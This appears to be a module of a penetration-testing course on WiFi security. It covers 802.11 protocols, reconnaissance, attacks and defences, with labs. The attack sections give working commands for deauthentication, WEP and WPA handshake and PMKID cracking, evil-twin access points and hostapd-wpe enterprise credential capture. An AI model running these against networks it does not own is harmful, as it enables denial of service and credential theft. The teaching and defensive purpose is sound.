# Stage 11: Wireless Network Hacking

## Overview

**Duration:** 30-40 hours  
**Difficulty:** Intermediate  
**Prerequisites:** Stage 1-10 (Networking Fundamentals, Sniffing & Evasion)

This stage covers wireless network security, common vulnerabilities in WiFi protocols, attack methodologies, and defensive countermeasures. Students will learn to assess wireless network security and implement proper protections.

---

## Learning Objectives

By the end of this stage, you will be able to:

1. Understand wireless network protocols and security mechanisms
2. Identify vulnerabilities in WEP, WPA, WPA2, and WPA3
3. Perform wireless network reconnaissance and enumeration
4. Execute common wireless attacks in controlled environments
5. Analyze and crack wireless authentication mechanisms
6. Implement wireless security best practices
7. Use professional wireless security assessment tools

---

## Module 11.1: Wireless Fundamentals (4-5 hours)

### 11.1.1 Wireless Standards and Protocols

```
IEEE 802.11 STANDARDS EVOLUTION:
════════════════════════════════

┌─────────────┬────────────┬─────────────┬──────────────────┐
│  Standard   │    Year    │  Max Speed  │    Frequency     │
├─────────────┼────────────┼─────────────┼──────────────────┤
│  802.11a    │    1999    │   54 Mbps   │      5 GHz       │
│  802.11b    │    1999    │   11 Mbps   │     2.4 GHz      │
│  802.11g    │    2003    │   54 Mbps   │     2.4 GHz      │
│  802.11n    │    2009    │  600 Mbps   │   2.4/5 GHz      │
│  802.11ac   │    2013    │  6.9 Gbps   │      5 GHz       │
│  802.11ax   │    2019    │  9.6 Gbps   │   2.4/5/6 GHz    │
│  (WiFi 6/6E)│            │             │                  │
└─────────────┴────────────┴─────────────┴──────────────────┘

FREQUENCY BANDS:
────────────────
2.4 GHz Band:
• Channels 1-14 (varies by country)
• Non-overlapping: 1, 6, 11
• Longer range, more interference
• More crowded

5 GHz Band:
• Many more channels available
• Less interference
• Shorter range
• Higher throughput

6 GHz Band (WiFi 6E):
• Newest band
• Minimal interference
• Requires newer hardware
```

### 11.1.2 Wireless Network Architecture

```
WIRELESS NETWORK COMPONENTS:
════════════════════════════

┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   ┌──────────┐                              ┌──────────┐        │
│   │ Client   │◄──── Radio Waves ────────────│  Access  │        │
│   │ (STA)    │                              │  Point   │        │
│   └──────────┘                              │  (AP)    │        │
│                                             └────┬─────┘        │
│   ┌──────────┐                                   │              │
│   │ Client   │◄─────────────────────────────────┤              │
│   │ (STA)    │                                   │              │
│   └──────────┘                                   │              │
│                                             ┌────▼─────┐        │
│                                             │  Wired   │        │
│                                             │ Network  │        │
│                                             └──────────┘        │
│                                                                 │
│   INFRASTRUCTURE MODE (Most Common)                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│   ┌──────────┐          ┌──────────┐          ┌──────────┐     │
│   │ Client   │◄────────▶│ Client   │◄────────▶│ Client   │     │
│   │   A      │          │    B     │          │    C     │     │
│   └──────────┘          └──────────┘          └──────────┘     │
│                                                                 │
│   AD-HOC MODE (Peer-to-Peer)                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

KEY TERMINOLOGY:
────────────────
• SSID    - Service Set Identifier (network name)
• BSSID   - Basic Service Set ID (AP's MAC address)
• ESSID   - Extended SSID (same name across multiple APs)
• Channel - Radio frequency slot
• Beacon  - AP announcements (broadcast every ~100ms)
• Probe   - Client requests for networks
```

### 11.1.3 Wireless Security Protocols

```python
#!/usr/bin/env python3
"""
wireless_security_overview.py - Wireless security protocols comparison
"""

SECURITY_PROTOCOLS = """
WIRELESS SECURITY EVOLUTION:
════════════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  WEP (Wired Equivalent Privacy) - 1997                                  │
│  ─────────────────────────────────────                                  │
│  • Status: BROKEN - DO NOT USE                                          │
│  • Encryption: RC4 stream cipher                                        │
│  • Key: 40-bit or 104-bit                                               │
│  • IV: 24-bit (too small, repeats quickly)                              │
│  • Vulnerabilities:                                                     │
│    - Weak IV attack                                                     │
│    - Key reuse                                                          │
│    - CRC32 integrity check is weak                                      │
│  • Can be cracked in minutes                                            │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  WPA (WiFi Protected Access) - 2003                                     │
│  ─────────────────────────────────────                                  │
│  • Status: DEPRECATED - Avoid if possible                               │
│  • Encryption: TKIP (Temporal Key Integrity Protocol)                   │
│  • Key: 256-bit                                                         │
│  • IV: 48-bit                                                           │
│  • Improvements over WEP:                                               │
│    - Per-packet key mixing                                              │
│    - Message Integrity Check (MIC)                                      │
│    - Longer IV                                                          │
│  • Vulnerabilities:                                                     │
│    - TKIP vulnerabilities                                               │
│    - Dictionary attacks on WPA-PSK                                      │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  WPA2 (802.11i) - 2004                                                  │
│  ────────────────────                                                   │
│  • Status: CURRENT STANDARD (with caveats)                              │
│  • Encryption: AES-CCMP                                                 │
│  • Key: 128-bit AES                                                     │
│  • Modes:                                                               │
│    - WPA2-Personal (PSK)                                                │
│    - WPA2-Enterprise (802.1X/RADIUS)                                    │
│  • Vulnerabilities:                                                     │
│    - KRACK attack (Key Reinstallation Attack)                           │
│    - Dictionary attacks on weak PSK                                     │
│    - PMKID attack                                                       │
│                                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  WPA3 - 2018                                                            │
│  ────────────                                                           │
│  • Status: LATEST STANDARD (recommended)                                │
│  • Encryption: AES-GCMP-256 (Enterprise)                                │
│  • Key Exchange: SAE (Simultaneous Authentication of Equals)            │
│  • Improvements:                                                        │
│    - Protection against offline dictionary attacks                      │
│    - Forward secrecy                                                    │
│    - Protected Management Frames (mandatory)                            │
│  • Modes:                                                               │
│    - WPA3-Personal                                                      │
│    - WPA3-Enterprise (192-bit mode)                                     │
│  • Known issues:                                                        │
│    - Dragonblood vulnerabilities (mostly patched)                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
"""

WPA_AUTHENTICATION = """
WPA2-PSK 4-WAY HANDSHAKE:
═════════════════════════

    Client (STA)                                Access Point (AP)
         │                                              │
         │◄──────────── 1. ANonce ─────────────────────│
         │              (AP's random nonce)             │
         │                                              │
         │              PTK = PRF(PMK + ANonce +        │
         │                        SNonce + MAC_AP +     │
         │                        MAC_STA)              │
         │                                              │
         │──────────── 2. SNonce + MIC ───────────────▶│
         │            (Client's nonce + integrity)      │
         │                                              │
         │              AP verifies MIC and             │
         │              derives same PTK                │
         │                                              │
         │◄─────────── 3. GTK + MIC ───────────────────│
         │            (Group key encrypted)             │
         │                                              │
         │──────────── 4. ACK + MIC ──────────────────▶│
         │            (Confirmation)                    │
         │                                              │

KEY HIERARCHY:
──────────────
PMK (Pairwise Master Key)
 │
 ├──▶ PTK (Pairwise Transient Key)
 │     ├── KCK (Key Confirmation Key) - MIC calculation
 │     ├── KEK (Key Encryption Key) - GTK encryption
 │     └── TK (Temporal Key) - Data encryption
 │
 └──▶ GMK (Group Master Key)
       └── GTK (Group Temporal Key) - Broadcast/multicast
"""

print(SECURITY_PROTOCOLS)
print(WPA_AUTHENTICATION)
```

---

## Module 11.2: Wireless Reconnaissance (5-6 hours)

### 11.2.1 Setting Up Wireless Tools

```bash
#!/bin/bash
# wireless_setup.sh - Set up wireless tools on Linux

# Check for wireless interface
echo "=== Wireless Interface Setup ==="

# List wireless interfaces
iw dev

# Check if interface supports monitor mode
iw phy phy0 info | grep -A 10 "Supported interface modes"

# Install required tools
sudo apt update
sudo apt install -y \
    aircrack-ng \
    wireshark \
    kismet \
    wifite \
    reaver \
    bettercap \
    hostapd-wpe \
    mdk4 \
    hcxtools \
    hcxdumptool \
    hashcat

# Enable monitor mode (replace wlan0 with your interface)
# sudo airmon-ng start wlan0
```

### 11.2.2 Network Discovery

```python
#!/usr/bin/env python3
"""
wireless_recon.py - Wireless network reconnaissance techniques
"""

MONITOR_MODE = """
ENABLING MONITOR MODE:
══════════════════════

Method 1: Using airmon-ng
─────────────────────────
# Check for interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify (interface becomes wlan0mon)
iwconfig

# Stop monitor mode when done
sudo airmon-ng stop wlan0mon


Method 2: Using iw commands
───────────────────────────
# Bring interface down
sudo ip link set wlan0 down

# Set monitor mode
sudo iw dev wlan0 set type monitor

# Bring interface up
sudo ip link set wlan0 up

# Verify
iw dev wlan0 info


Method 3: Using iwconfig
────────────────────────
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
"""

AIRODUMP_COMMANDS = """
AIRODUMP-NG USAGE:
══════════════════

# Basic scan (all channels)
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Scan specific band
sudo airodump-ng --band a wlan0mon    # 5 GHz
sudo airodump-ng --band bg wlan0mon   # 2.4 GHz
sudo airodump-ng --band abg wlan0mon  # All bands

# Target specific network (capture to file)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Filter by encryption type
sudo airodump-ng --encrypt wpa2 wlan0mon
sudo airodump-ng --encrypt wep wlan0mon

OUTPUT COLUMNS:
───────────────
BSSID      - AP MAC address
PWR        - Signal power (higher = closer)
Beacons    - Number of beacon frames
#Data      - Number of data frames
#/s        - Data packets per second
CH         - Channel
MB         - Maximum speed
ENC        - Encryption (WEP, WPA, WPA2)
CIPHER     - Cipher (CCMP, TKIP, WEP)
AUTH       - Authentication (PSK, MGT)
ESSID      - Network name

STATION    - Client MAC address
PROBE      - Networks client is probing for
"""

KISMET_GUIDE = """
KISMET USAGE:
═════════════

# Start Kismet
sudo kismet

# Access web interface
# Navigate to http://localhost:2501

# Kismet provides:
• Passive scanning (no transmission)
• Device detection and tracking
• GPS integration
• Alert on suspicious activity
• Log in pcap format

# Command line capture
sudo kismet -c wlan0mon --no-ncurses
"""

print(MONITOR_MODE)
print(AIRODUMP_COMMANDS)
```

### 11.2.3 Client Enumeration

```python
#!/usr/bin/env python3
"""
client_enumeration.py - Enumerate wireless clients
"""

from scapy.all import *
from collections import defaultdict
import time

class WirelessScanner:
    """Scan for wireless networks and clients (educational)"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.networks = {}
        self.clients = defaultdict(list)
        self.probes = defaultdict(set)
    
    def packet_handler(self, pkt):
        """Process captured packets"""
        
        # Beacon frames (AP advertisement)
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode()
            except:
                ssid = "<hidden>"
            
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel", "?")
            crypto = stats.get("crypto", set())
            
            self.networks[bssid] = {
                "ssid": ssid,
                "channel": channel,
                "crypto": crypto
            }
        
        # Probe requests (client looking for networks)
        elif pkt.haslayer(Dot11ProbeReq):
            client_mac = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode()
                if ssid:
                    self.probes[client_mac].add(ssid)
            except:
                pass
        
        # Data frames (client connected to AP)
        elif pkt.haslayer(Dot11) and pkt.type == 2:
            ds = pkt.FCfield & 0x3
            
            if ds == 1:  # To DS (client -> AP)
                client = pkt[Dot11].addr2
                ap = pkt[Dot11].addr1
                if client and ap:
                    if client not in self.clients[ap]:
                        self.clients[ap].append(client)
    
    def scan(self, duration: int = 60):
        """Scan for specified duration"""
        print(f"[*] Scanning on {self.interface} for {duration} seconds...")
        print("[*] Press Ctrl+C to stop early\n")
        
        try:
            sniff(iface=self.interface, 
                  prn=self.packet_handler,
                  timeout=duration,
                  store=0)
        except KeyboardInterrupt:
            pass
        
        self.print_results()
    
    def print_results(self):
        """Print scan results"""
        print("\n" + "="*70)
        print("DISCOVERED NETWORKS")
        print("="*70)
        print(f"{'BSSID':<18} {'SSID':<25} {'CH':<4} {'ENCRYPTION'}")
        print("-"*70)
        
        for bssid, info in self.networks.items():
            crypto = ", ".join(info["crypto"]) if info["crypto"] else "Open"
            print(f"{bssid:<18} {info['ssid']:<25} {info['channel']:<4} {crypto}")
        
        print("\n" + "="*70)
        print("CONNECTED CLIENTS")
        print("="*70)
        
        for ap, clients in self.clients.items():
            ssid = self.networks.get(ap, {}).get("ssid", "Unknown")
            print(f"\n[{ap}] {ssid}")
            for client in clients:
                print(f"  └── {client}")
        
        print("\n" + "="*70)
        print("PROBE REQUESTS")
        print("="*70)
        
        for client, probes in self.probes.items():
            print(f"\n{client}")
            for probe in probes:
                print(f"  └── {probe}")


# Usage example (requires root and monitor mode)
USAGE = """
# Usage (requires root and monitor mode interface):
scanner = WirelessScanner("wlan0mon")
scanner.scan(duration=120)
"""

print("Wireless Scanner - Educational Tool")
print("Requires: Monitor mode interface, root privileges")
print(USAGE)
```

---

## Module 11.3: Wireless Attacks (8-10 hours)

### 11.3.1 WEP Cracking

```python
#!/usr/bin/env python3
"""
wep_attacks.py - WEP attack methodology (educational reference)
"""

WEP_ATTACK = """
WEP CRACKING METHODOLOGY:
═════════════════════════

WEP is fundamentally broken. Here's why and how:

VULNERABILITY:
──────────────
• 24-bit IV is too small (repeats after ~5000 packets)
• RC4 key scheduling weakness
• CRC32 provides no real integrity protection
• Same key used for all clients

ATTACK STEPS:
─────────────

1. IDENTIFY TARGET
   ────────────────
   sudo airodump-ng wlan0mon
   # Look for networks with ENC: WEP

2. CAPTURE TRAFFIC (Target specific network)
   ──────────────────────────────────────────
   sudo airodump-ng -c [channel] --bssid [AP_MAC] -w wep_capture wlan0mon

3. GENERATE TRAFFIC (if needed)
   ─────────────────────────────
   # ARP replay attack
   sudo aireplay-ng -3 -b [AP_MAC] -h [Client_MAC] wlan0mon
   
   # If no clients, use fake authentication first
   sudo aireplay-ng -1 0 -a [AP_MAC] -h [Your_MAC] wlan0mon

4. CRACK THE KEY
   ──────────────
   sudo aircrack-ng wep_capture*.cap
   
   # With 20,000+ IVs, cracking takes seconds

REQUIRED IVs:
─────────────
• 40-bit key: ~20,000 IVs
• 104-bit key: ~40,000 IVs
• With PTW attack: ~20,000 IVs for any key

DEFENSE:
────────
• DO NOT USE WEP
• Upgrade to WPA2 or WPA3
• WEP provides essentially no security
"""

print(WEP_ATTACK)
```

### 11.3.2 WPA/WPA2 Attacks

```python
#!/usr/bin/env python3
"""
wpa_attacks.py - WPA/WPA2 attack methodologies
"""

WPA_HANDSHAKE_ATTACK = """
WPA/WPA2 PSK CRACKING:
══════════════════════

The 4-way handshake contains enough information to verify password guesses.

METHODOLOGY:
────────────

1. CAPTURE THE HANDSHAKE
   ──────────────────────
   # Start capture on target channel
   sudo airodump-ng -c [channel] --bssid [AP_MAC] -w wpa_capture wlan0mon
   
   # Wait for client connection, OR force deauthentication
   sudo aireplay-ng -0 5 -a [AP_MAC] -c [Client_MAC] wlan0mon
   
   # Handshake captured when "WPA handshake: [MAC]" appears

2. VERIFY HANDSHAKE
   ─────────────────
   # Check if handshake is valid
   sudo aircrack-ng wpa_capture*.cap
   
   # Alternative: Wireshark filter
   # eapol

3. CRACK WITH DICTIONARY
   ──────────────────────
   # Using aircrack-ng
   sudo aircrack-ng -w wordlist.txt wpa_capture*.cap
   
   # Using hashcat (much faster with GPU)
   # First convert to hashcat format
   sudo hcxpcapngtool -o hash.hc22000 wpa_capture*.cap
   
   # Then crack
   hashcat -m 22000 hash.hc22000 wordlist.txt

4. RULE-BASED ATTACKS
   ───────────────────
   # Hashcat with rules
   hashcat -m 22000 hash.hc22000 wordlist.txt -r best64.rule
   
   # Common password patterns:
   # - CompanyName2024!
   # - SeasonYear (Summer2024)
   # - KeyboardPatterns (qwerty123)
"""

PMKID_ATTACK = """
PMKID ATTACK (No Client Needed):
════════════════════════════════

Attack discovered in 2018 - no client or deauth required!

HOW IT WORKS:
─────────────
• PMKID is in the first message of 4-way handshake
• Some APs include it in RSN IE of beacon/probe responses
• PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
• Can verify password guesses without full handshake

METHODOLOGY:
────────────

1. CAPTURE PMKID
   ──────────────
   # Using hcxdumptool
   sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
   
   # Or target specific AP
   sudo hcxdumptool -i wlan0mon --filterlist=targetlist.txt \
        --filtermode=2 -o capture.pcapng

2. EXTRACT HASH
   ─────────────
   hcxpcapngtool -o pmkid.hc22000 capture.pcapng

3. CRACK
   ──────
   hashcat -m 22000 pmkid.hc22000 wordlist.txt

LIMITATIONS:
────────────
• Not all APs support PMKID
• Still requires weak password
• WPA3-SAE is not vulnerable
"""

KRACK_ATTACK = """
KRACK (Key Reinstallation Attack):
══════════════════════════════════

Discovered 2017 - affects WPA2 protocol itself.

VULNERABILITY:
──────────────
• Nonce reuse in 4-way handshake
• Attacker blocks Message 4, AP retransmits Message 3
• Client reinstalls already-in-use key
• Nonce reset allows key stream reuse
• Can decrypt, replay, and potentially forge packets

AFFECTED SYSTEMS:
─────────────────
• All WPA2 implementations (initially)
• Especially severe on Linux/Android (key zeroing)
• Most systems now patched

DEFENSE:
────────
• Apply security updates
• Use HTTPS/TLS for sensitive data
• Upgrade to WPA3
• WPA3 has mandatory Protected Management Frames
"""

DEAUTH_ATTACK = """
DEAUTHENTICATION ATTACK:
════════════════════════

Management frames in 802.11 are unencrypted (pre-WPA3).

PURPOSE:
────────
• Force clients to reconnect (capture handshake)
• Denial of Service
• Force connection to rogue AP

COMMANDS:
─────────
# Deauth specific client
sudo aireplay-ng -0 10 -a [AP_MAC] -c [Client_MAC] wlan0mon

# Deauth all clients (broadcast)
sudo aireplay-ng -0 10 -a [AP_MAC] wlan0mon

# Using mdk4
sudo mdk4 wlan0mon d -c [channel]

DEFENSE:
────────
• WPA3 with Protected Management Frames (PMF)
• 802.11w (Management Frame Protection)
• Wireless IDS to detect attacks
"""

print(WPA_HANDSHAKE_ATTACK)
print(PMKID_ATTACK)
```

### 11.3.3 Rogue Access Point Attacks

```python
#!/usr/bin/env python3
"""
rogue_ap.py - Rogue access point attack concepts
"""

EVIL_TWIN = """
EVIL TWIN ATTACK:
═════════════════

Create a fake AP that mimics a legitimate network.

ATTACK FLOW:
────────────

    ┌──────────┐        ┌──────────────┐        ┌──────────┐
    │  Victim  │◄──────▶│  Evil Twin   │◄──────▶│ Attacker │
    │  Client  │        │  (Fake AP)   │        │  System  │
    └──────────┘        └──────────────┘        └──────────┘
         ▲                                            │
         │                                            │
         └─────── Deauth from real AP ────────────────┘

METHODOLOGY:
────────────

1. IDENTIFY TARGET NETWORK
   ────────────────────────
   sudo airodump-ng wlan0mon
   # Note SSID, channel, BSSID

2. SET UP EVIL TWIN
   ─────────────────
   # Create hostapd config
   cat > evil_twin.conf << EOF
   interface=wlan1
   driver=nl80211
   ssid=TargetSSID
   hw_mode=g
   channel=6
   EOF
   
   # Start fake AP
   sudo hostapd evil_twin.conf

3. SET UP DHCP
   ────────────
   # Configure dnsmasq
   sudo dnsmasq -C dnsmasq.conf

4. DEAUTH LEGITIMATE CLIENTS
   ──────────────────────────
   sudo aireplay-ng -0 0 -a [Real_AP_MAC] wlan0mon

5. CAPTURE TRAFFIC
   ────────────────
   # Clients connect to evil twin
   # Capture credentials, redirect traffic, etc.

CAPTIVE PORTAL ATTACK:
──────────────────────
• Clone login page of target network
• Victim sees "Enter WiFi password"
• Credential captured

TOOLS:
──────
• hostapd - Create access point
• dnsmasq - DHCP and DNS
• wifiphisher - Automated evil twin
• Fluxion - Automated credential capture
"""

KARMA_ATTACK = """
KARMA/MANA ATTACK:
══════════════════

Respond to ANY probe request as if you're that network.

HOW IT WORKS:
─────────────
• Devices constantly probe for known networks
• KARMA AP responds "Yes, I'm [probed network]"
• Device auto-connects
• Works because devices trust SSID alone

    Client: "Is 'HomeWiFi' here?"
    KARMA:  "Yes, I'm HomeWiFi, connect to me!"
    Client: *connects*

DEFENSE:
────────
• Disable auto-connect on devices
• Remove saved networks you don't use
• Use VPN on untrusted networks
• Verify network before entering credentials
"""

print(EVIL_TWIN)
print(KARMA_ATTACK)
```

---

## Module 11.4: WPA Enterprise Attacks (4-5 hours)

### 11.4.1 EAP Overview

```
WPA ENTERPRISE (802.1X):
════════════════════════

ARCHITECTURE:
─────────────

    ┌────────────┐     ┌─────────────┐     ┌──────────────┐
    │            │     │             │     │              │
    │  Supplicant│────▶│Authenticator│────▶│  RADIUS      │
    │  (Client)  │     │    (AP)     │     │  Server      │
    │            │     │             │     │              │
    └────────────┘     └─────────────┘     └──────────────┘
         │                   │                    │
         │◄─────── EAP ─────▶│◄──── RADIUS ─────▶│

EAP TYPES:
──────────
• EAP-TLS       - Certificate-based (most secure)
• EAP-TTLS      - Tunneled TLS
• PEAP          - Protected EAP (common with MSCHAPv2)
• EAP-FAST      - Flexible Authentication
• EAP-GTC       - Generic Token Card

COMMON VULNERABILITIES:
───────────────────────
• Missing/weak certificate validation
• Credential theft with rogue RADIUS
• Downgrade attacks
• Dictionary attacks on MSCHAPv2
```

### 11.4.2 Enterprise Attacks

```python
#!/usr/bin/env python3
"""
enterprise_attacks.py - WPA Enterprise attack concepts
"""

HOSTAPD_WPE = """
HOSTAPD-WPE (Wireless Pwnage Edition):
══════════════════════════════════════

Captures credentials from WPA Enterprise clients.

HOW IT WORKS:
─────────────
1. Set up rogue RADIUS server with fake certificate
2. Client connects and sends credentials
3. Capture challenge/response for cracking

SETUP:
──────
# Install hostapd-wpe
git clone https://github.com/OpenSecurityResearch/hostapd-wpe

# Configure (hostapd-wpe.conf)
interface=wlan0
driver=nl80211
ssid=CorpWiFi
channel=6
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key

# Run
sudo hostapd-wpe hostapd-wpe.conf

# Captured credentials:
# mschapv2: username:::challenge:response

CRACK CAPTURED HASHES:
──────────────────────
# Using asleap
asleap -C [challenge] -R [response] -W wordlist.txt

# Using hashcat
hashcat -m 5500 hash.txt wordlist.txt
"""

DEFENSE_ENTERPRISE = """
DEFENDING WPA ENTERPRISE:
═════════════════════════

1. CERTIFICATE VALIDATION
   ───────────────────────
   • Configure clients to verify server certificate
   • Pin the certificate or CA
   • Don't allow "trust on first use"
   • Use EAP-TLS with client certificates

2. PROPER EAP TYPE
   ────────────────
   • Prefer EAP-TLS (certificates both sides)
   • Avoid EAP methods with weak auth (MSCHAPv2)
   • Use strong passwords if using PEAP

3. MONITORING
   ───────────
   • Detect rogue APs with same SSID
   • Monitor RADIUS logs for failed auth
   • Alert on certificate changes

4. CLIENT CONFIGURATION
   ─────────────────────
   • Deploy enterprise profiles via MDM
   • Pre-configure trusted certificates
   • Disable "validate server certificate" bypass
"""

print(HOSTAPD_WPE)
print(DEFENSE_ENTERPRISE)
```

---

## Module 11.5: Wireless Defense (4-5 hours)

### 11.5.1 Securing Wireless Networks

```python
#!/usr/bin/env python3
"""
wireless_defense.py - Wireless security best practices
"""

SECURITY_CHECKLIST = """
WIRELESS SECURITY CHECKLIST:
════════════════════════════

ACCESS POINT CONFIGURATION:
───────────────────────────
☐ Use WPA3 or WPA2-AES (never WEP or TKIP)
☐ Strong, unique PSK (20+ characters, random)
☐ Change default admin credentials
☐ Disable WPS (WiFi Protected Setup)
☐ Enable Protected Management Frames (PMF)
☐ Update firmware regularly
☐ Disable remote administration
☐ Use separate SSID for guests
☐ Enable AP isolation for guest network

ENTERPRISE ENVIRONMENT:
───────────────────────
☐ Use WPA2/WPA3 Enterprise with RADIUS
☐ Implement EAP-TLS if possible
☐ Enforce certificate validation on clients
☐ Segment wireless from critical networks
☐ Deploy Wireless IDS/IPS
☐ Regular security audits
☐ Monitor for rogue access points
☐ Implement NAC (Network Access Control)

CLIENT SECURITY:
────────────────
☐ Remove unused saved networks
☐ Disable auto-connect feature
☐ Use VPN on untrusted networks
☐ Verify network authenticity
☐ Keep wireless drivers updated
☐ Use firewall on wireless interfaces
"""

PASSWORD_GUIDELINES = """
WPA2/WPA3 PASSWORD GUIDELINES:
══════════════════════════════

REQUIREMENTS:
─────────────
• Minimum 20 characters
• Mix of uppercase, lowercase, numbers, symbols
• NOT a dictionary word or common phrase
• Unique (not reused elsewhere)
• Randomly generated preferred

EXAMPLES:
─────────
Bad:  Summer2024          (predictable pattern)
Bad:  CompanyWifi123      (company name based)
Bad:  password123!        (common password)
Good: 7hK$2nP!mQz9@xWv5bR (random characters)
Good: correct-horse-battery-staple (random words, very long)

GENERATION:
───────────
# Using OpenSSL
openssl rand -base64 24

# Using Python
python3 -c "import secrets; print(secrets.token_urlsafe(24))"

ROTATION:
─────────
• Change immediately if compromise suspected
• Rotate when employees leave
• Annual rotation for enterprise
• Document password changes
"""

ROGUE_AP_DETECTION = """
ROGUE AP DETECTION:
═══════════════════

INDICATORS:
───────────
• Same SSID, different BSSID
• Unexpected signal strength changes
• Different encryption than expected
• Unusual channel usage
• Multiple APs with same MAC

DETECTION METHODS:
──────────────────

1. Wireless IDS (WIDS)
   • Monitor for unauthorized APs
   • Detect evil twin attacks
   • Alert on deauth floods
   • Examples: AirMagnet, Kismet

2. Active Scanning
   • Regularly scan for new APs
   • Compare against authorized list
   • Flag unknown devices

3. Client-Side Detection
   • Certificate pinning
   • Verify AP fingerprint
   • Check for captive portals

RESPONSE:
─────────
1. Identify location of rogue AP
2. Physically locate and remove
3. Investigate if data was compromised
4. Strengthen detection capabilities
"""

print(SECURITY_CHECKLIST)
print(PASSWORD_GUIDELINES)
print(ROGUE_AP_DETECTION)
```

### 11.5.2 Wireless IDS/IPS

```
WIRELESS INTRUSION DETECTION:
═════════════════════════════

ATTACK SIGNATURES:
──────────────────
• Deauthentication floods
• Authentication floods
• Fake AP (evil twin)
• Probe request floods
• Association floods
• EAPOL floods
• Unusual management frames

DETECTION ARCHITECTURE:
───────────────────────

    ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
    │   Sensor    │────▶│   WIDS      │────▶│   Console   │
    │  (Monitor)  │     │   Server    │     │  (Alerts)   │
    └─────────────┘     └─────────────┘     └─────────────┘
          │                   │
          │                   ▼
    ┌─────▼─────┐     ┌─────────────┐
    │  Wireless │     │ Correlation │
    │  Traffic  │     │   Engine    │
    └───────────┘     └─────────────┘

TOOLS:
──────
• Kismet - Wireless network detector and IDS
• AirMagnet - Commercial enterprise solution
• Snort with wireless signatures
• OpenWIPS-ng - Open source WIPS
```

---

## Module 11.6: Hands-On Labs (4-5 hours)

### Lab 11.1: Wireless Reconnaissance

```
╔══════════════════════════════════════════════════════════════════════════╗
║                  LAB 11.1: WIRELESS RECONNAISSANCE                       ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  OBJECTIVE: Perform wireless network discovery and enumeration           ║
║                                                                          ║
║  REQUIREMENTS:                                                           ║
║  • Linux system with compatible wireless adapter                         ║
║  • Adapter capable of monitor mode                                       ║
║  • Permission to scan in your environment                                ║
║                                                                          ║
║  TASKS:                                                                  ║
║  ─────                                                                   ║
║  1. Enable monitor mode on wireless interface                            ║
║  2. Scan for networks using airodump-ng                                  ║
║  3. Identify network encryption types                                    ║
║  4. Enumerate connected clients                                          ║
║  5. Capture probe requests                                               ║
║  6. Document all findings                                                ║
║                                                                          ║
║  DELIVERABLES:                                                           ║
║  • List of discovered networks with encryption                           ║
║  • Connected clients per network                                         ║
║  • Probe request analysis                                                ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### Lab 11.2: WPA Handshake Capture and Analysis

```
╔══════════════════════════════════════════════════════════════════════════╗
║                  LAB 11.2: WPA HANDSHAKE ANALYSIS                        ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  OBJECTIVE: Capture and analyze WPA 4-way handshake                      ║
║  (Use YOUR OWN network or authorized test network only)                  ║
║                                                                          ║
║  SETUP:                                                                  ║
║  • Your own WiFi network with known password                             ║
║  • Linux system with monitor-mode adapter                                ║
║  • Second device to generate handshake                                   ║
║                                                                          ║
║  TASKS:                                                                  ║
║  ─────                                                                   ║
║  1. Start capture on target channel                                      ║
║     sudo airodump-ng -c [ch] --bssid [MAC] -w test wlan0mon              ║
║                                                                          ║
║  2. Trigger handshake (disconnect/reconnect your device)                 ║
║     Or: sudo aireplay-ng -0 1 -a [AP_MAC] wlan0mon                       ║
║                                                                          ║
║  3. Verify handshake captured                                            ║
║     aircrack-ng test*.cap                                                ║
║                                                                          ║
║  4. Analyze handshake in Wireshark                                       ║
║     Filter: eapol                                                        ║
║                                                                          ║
║  5. Attempt crack with known password in wordlist                        ║
║     aircrack-ng -w wordlist.txt test*.cap                                ║
║                                                                          ║
║  ANALYSIS QUESTIONS:                                                     ║
║  • How many EAPOL frames in complete handshake?                          ║
║  • What information is in each message?                                  ║
║  • Why is dictionary attack the primary method?                          ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## Summary and Key Takeaways

### Security Protocol Comparison

| Protocol | Security | Recommendation |
|----------|----------|----------------|
| WEP | Broken | Never use |
| WPA/TKIP | Weak | Avoid |
| WPA2-AES | Good | Acceptable with strong PSK |
| WPA3 | Best | Recommended |

### Defense Priorities

1. Use WPA3 or WPA2-AES with strong passwords
2. Disable WPS
3. Enable Protected Management Frames
4. Implement rogue AP detection
5. Segment wireless networks
6. Regular security audits

### Essential Tools

| Tool | Purpose |
|------|---------|
| aircrack-ng suite | Comprehensive wireless testing |
| Wireshark | Protocol analysis |
| Kismet | Detection and monitoring |
| hcxtools | PMKID and handshake tools |
| hashcat | GPU-accelerated cracking |

---

## Further Reading

- IEEE 802.11 Standards
- WiFi Alliance Security Guidelines
- KRACK Attack Paper: https://www.krackattacks.com/
- Dragonblood (WPA3 vulnerabilities): https://wpa3.mathyvanhoef.com/
- NIST Wireless Security Guidelines

---

